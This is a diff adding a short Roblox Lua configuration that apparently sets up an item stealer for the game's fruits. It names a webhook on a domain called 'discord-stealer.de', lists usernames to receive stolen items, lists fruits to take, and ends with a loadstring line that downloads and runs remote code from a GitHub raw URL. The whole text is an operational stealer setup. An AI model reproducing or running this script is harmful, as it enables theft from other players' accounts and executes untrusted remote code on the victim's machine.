@@ -1,0 +1,5 @@
+Webhook = "https://discord-stealer.de/post?uniqueid=8c809aa7" -- << Your Webhook
+Usernames = {"DGEZHDT62", "DGEZHDT622"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Dragon-Dragon", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
